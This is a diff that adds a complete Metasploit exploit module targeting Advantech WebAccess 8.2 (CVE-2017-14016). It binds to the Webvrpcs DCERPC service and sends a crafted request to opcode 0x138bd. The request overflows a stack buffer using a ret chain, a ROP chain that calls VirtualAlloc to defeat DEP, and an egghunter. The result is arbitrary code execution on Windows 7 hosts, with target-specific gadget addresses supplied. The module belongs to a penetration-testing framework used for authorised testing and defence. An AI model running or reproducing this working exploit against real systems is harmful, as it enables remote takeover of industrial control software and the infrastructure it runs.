@@ -1,0 +1,141 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = GoodRanking
+
+  include Msf::Exploit::Remote::DCERPC
+  include Msf::Exploit::Egghunter
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Advantech WebAccess Webvrpcs Service Opcode 80061 Stack Buffer Overflow',
+      'Description'    => %q{
+          This module exploits a stack buffer overflow in Advantech WebAccess 8.2.
+          By sending a specially crafted DCERPC request, an attacker could overflow
+          the buffer and execute arbitrary code.
+      },
+      'Author'         => [ 'mr_me <mr_me[at]offensive-security[dot]com>' ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'ZDI', '17-938' ],
+          [ 'CVE', '2017-14016' ],
+          [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-17-306-02' ]
+        ],
+      'Privileged'     => true,
+      'DefaultOptions' =>
+        {
+          'EXITFUNC' => 'thread',
+        },
+      'Payload'        =>
+        {
+          'Space'    => 2048,
+          'BadChars' => "\x00",
+        },
+      'Platform' => 'win',
+      'Targets'  =>
+        [
+          [ 'Windows 7 x86 - Advantech WebAccess 8.2-2017.03.31',
+            {
+              'Ret'   => 0x07036cdc,  # pop ebx; add esp, 994; retn 0x14
+              'Slide' => 0x07048f5b,  # retn
+              'Jmp'   => 0x0706067e   # pop ecx; pop ecx; ret 0x04
+            }
+          ],
+        ],
+      'DisclosureDate' => 'Nov 02 2017',
+      'DefaultTarget'  => 0))
+    register_options([ Opt::RPORT(4592)])
+  end
+
+  def create_rop_chain()
+
+    # this target opts into dep
+    rop_gadgets =
+    [
+      0x020214c6,  # POP EAX # RETN [BwKrlAPI.dll]
+      0x0203a134,  # ptr to &VirtualAlloc() [IAT BwKrlAPI.dll]
+      0x02032fb4,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BwKrlAPI.dll]
+      0x070738ee,  # XCHG EAX,ESI # RETN [BwPAlarm.dll]
+      0x0201a646,  # POP EBP # RETN [BwKrlAPI.dll]
+      0x07024822,  # & push esp # ret  [BwPAlarm.dll]
+      0x070442dd,  # POP EAX # RETN [BwPAlarm.dll]
+      0xffffffff,  # Value to negate, will become 0x00000001
+      0x070467d2,  # NEG EAX # RETN [BwPAlarm.dll]
+      0x0704de61,  # PUSH EAX # ADD ESP,0C # POP EBX # RETN [BwPAlarm.dll]
+      rand_text_alpha(4).unpack('V'),
+      rand_text_alpha(4).unpack('V'),
+      rand_text_alpha(4).unpack('V'),
+      0x02030af7,  # POP EAX # RETN [BwKrlAPI.dll]
+      0xfbdbcbd5,  # put delta into eax (-> put 0x00001000 into edx)
+      0x02029003,  # ADD EAX,424442B # RETN [BwKrlAPI.dll]
+      0x0201234a,  # XCHG EAX,EDX # RETN [BwKrlAPI.dll]
+      0x07078df5,  # POP EAX # RETN [BwPAlarm.dll]
+      0xffffffc0,  # Value to negate, will become 0x00000040
+      0x070467d2,  # NEG EAX # RETN [BwPAlarm.dll]
+      0x07011e60,  # PUSH EAX # ADD AL,5B # POP ECX # RETN 0x08 [BwPAlarm.dll]
+      0x0706fe66,  # POP EDI # RETN [BwPAlarm.dll]
+      rand_text_alpha(4).unpack('V'),
+      rand_text_alpha(4).unpack('V'),
+      0x0703d825,  # RETN (ROP NOP) [BwPAlarm.dll]
+      0x0202ca65,  # POP EAX # RETN [BwKrlAPI.dll]
+      0x90909090,  # nop
+      0x07048f5a,  # PUSHAD # RETN [BwPAlarm.dll]
+    ].flatten.pack("V*")
+    return rop_gadgets
+  end
+
+  def exploit
+    connect
+    handle = dcerpc_handle('5d2b62aa-ee0a-4a95-91ae-b064fdb471fc', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])
+    print_status("Binding to #{handle} ...")
+    dcerpc_bind(handle)
+    print_status("Bound to #{handle} ...")
+
+    # send the request to get the handle
+    resp   = dcerpc.call(0x4, [0x02000000].pack('V'))
+    handle = resp.last(4).unpack('V').first
+    print_good("Got a handle: 0x%08x" % handle)
+    egg_options = { :eggtag   => "0day" }
+    egghunter, egg = generate_egghunter(payload.encoded, payload_badchars, egg_options)
+
+    # apparently this is called a ret chain
+    overflow  = [target['Slide']].pack('V')
+    overflow << [target['Slide']].pack('V')
+    overflow << [target['Slide']].pack('V')
+    overflow << [target['Slide']].pack('V')
+    overflow << [target['Slide']].pack('V')
+    overflow << [target['Slide']].pack('V')
+    overflow << [target['Jmp']].pack('V')
+    overflow << [target['Ret']].pack('V')
+    overflow << [target['Slide']].pack('V')
+    overflow << [target['Slide']].pack('V')
+    overflow << [target['Slide']].pack('V')
+    overflow << [target['Slide']].pack('V')
+    overflow << [target['Slide']].pack('V')
+    overflow << [target['Slide']].pack('V')
+    overflow << create_rop_chain()
+    overflow << egghunter
+    overflow << egg
+    overflow << rand_text_alpha(0x1000-overflow.length)
+
+    # sorry but I dont like msf's ndr class.
+    sploit  = [handle].pack('V')
+    sploit << [0x000138bd].pack('V')  # opcode we are attacking
+    sploit << [0x00001000].pack('V')  # size to copy
+    sploit << [0x00001000].pack('V')  # size of string
+    sploit << overflow
+    print_status("Trying target #{target.name}...")
+    begin
+        dcerpc_call(0x1, sploit)
+        rescue Rex::Proto::DCERPC::Exceptions::NoResponse
+    ensure
+        disconnect
+    end
+    handler
+  end
+end
